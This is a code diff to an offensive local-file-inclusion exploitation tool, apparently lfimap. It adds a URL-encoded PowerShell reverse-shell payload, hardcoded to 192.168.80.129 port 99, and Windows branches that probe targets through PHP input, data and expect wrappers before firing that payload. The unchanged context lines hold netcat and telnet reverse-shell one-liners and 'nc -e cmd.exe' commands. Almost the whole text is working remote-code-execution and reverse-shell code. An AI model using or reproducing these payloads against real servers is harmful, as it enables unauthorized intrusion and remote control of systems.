@@ -415,6 +415,7 @@ def exploit(exploits, method):
         ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
         telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
         
+        powershellPayload = "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""
 
         if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
             
@@ -472,14 +473,27 @@ def exploit(exploits, method):
             
             #WINDOWS
             elif(exploit['OS'] == 'WINDOWS'):
+                
                 url = exploit['GETVAL']
-                u = url.replace('TMP', 'dir%20C:\Windows\System32')
+               
+                #Netcat
+                u = url.replace('TMP', 'powershell.exe+if(Test-Path+%25windir%25\System32\\nc.exe){Write-Output+"lfimap-nc.exe"}%3b')
                 res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
-                if('nc.exe' in res.text):
+                if('lfimap-nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                     printInfo(ip, port, 'nc', 'input wrapper')
                     res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                     return
+                
+                #Powershell
+                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                if('Windows IP Configuration' in res.text):
+                    u = url.replace('TMP', powershellPayload) 
+                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
+                    printInfo(ip, port, 'powershell', 'input wrapper')
+                    return
+
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
             #Linux
@@ -534,14 +548,24 @@ def exploit(exploits, method):
             #Windows
             else:
                 url = exploit['GETVAL']
+
+                #Netcat
                 u = url.replace('TMP', "dir%20C:\Windows\System32")
                 res = requests.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
                     u = url.replace('TMP', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
-                    printInfo(ip, port, 'nc', 'input wrapper')
+                    printInfo(ip, port, 'nc', 'data wrapper')
                     res = requests.get(u, headers = headers, proxies = proxies)
                     return
-
+                
+                #Powershell
+                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                res = requests.get(u, headers = headers, proxies = proxies)
+                if('Windows IP Configuration' in res.text):
+                    printInfo(ip, port, 'powershell', 'data wrapper')
+                    u = url.replace('TMP', powershellPayload)
+                    requests.get(u, headers = headers, proxies = proxies)
+                    return
 
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
@@ -596,6 +620,8 @@ def exploit(exploits, method):
             #Windows
             else:
                 url = exploit['GETVAL']
+                
+                #Netcat
                 u = url.replace('TMP', "dir%20C:\Windows\System32")
                 res = request.get(u, headers = headers, proxies = proxies)
                 if('nc.exe' in res.text):
@@ -604,7 +630,13 @@ def exploit(exploits, method):
                     res = request.get(u, headers = headers, proxies = proxies)
                     return
 
-
+                #Powershell
+                u = url.replace('TMP', 'powershell.exe%20ipconfig')
+                if('Windows IP Configuration' in res.text):
+                    u = url.replace('TMP', powershellPayload)
+                    printInfo(ip, port, 'powershell', 'expect wrapper')
+                    requests.get(u, headers = headers, proxies = proxies)
+                    return
 
         elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
             #LINUX
